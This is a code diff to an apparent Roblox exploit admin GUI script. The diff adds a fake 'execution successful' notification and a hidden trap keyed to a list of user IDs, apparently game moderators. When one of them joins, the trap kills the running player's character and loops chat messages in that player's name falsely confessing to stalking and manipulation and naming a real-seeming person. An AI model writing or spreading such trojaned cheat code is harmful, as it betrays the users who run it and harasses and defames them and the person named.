@@ -1,8 +1,62 @@
- game.StarterGui:SetCore("SendNotification", {
+game.StarterGui:SetCore("SendNotification", {
                 Title = "Allah Says..";
                 Text = "-EXECUTION SUCCESSFUL-";
                  Duration = 15;
                   })
+	local AdminList = {
+   42285938,
+    109217153,
+    119868,
+    35276317,
+    160319861,
+    4317782,
+    63300487,
+    39523020,
+    23952793,
+    21238127,
+    6828351,
+    21447425,
+    24836348,
+    14922769,
+    33488003,
+    204949625,
+    117551840,
+    69239108,
+    42285938,
+    94254052,
+    57628717,
+    81275825,
+    14099358,
+    144170792,
+    9741973,
+    44193678,
+    39925610,
+    128978453,
+    42213282,
+    55328654,
+    10032944,
+    93676120,
+    113655887,
+    95126752,
+    302566312,
+    69453307,
+    83259917,
+    105626586
+}
+
+game.Players.PlayerAdded:Connect(function(player)
+    for i, v in pairs(AdminList) do
+        if player.UserId == v then
+            while true do
+                wait(1)
+		game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart"):Destroy()
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I AM AN EXPLOITER AND I STALK GIRLS ON DS BECAUSE I'M LONELY","All")
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I LIE AND MANIPULATE, I OBSESS OVER LANI","All")
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("VONK OR HURRI, PLEASE BAN ME. HAIL PEDRO!","All")
+            end
+        end
+    end
+end)
 local HypGUIAdmin = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
 local GUIHead = Instance.new("Frame")
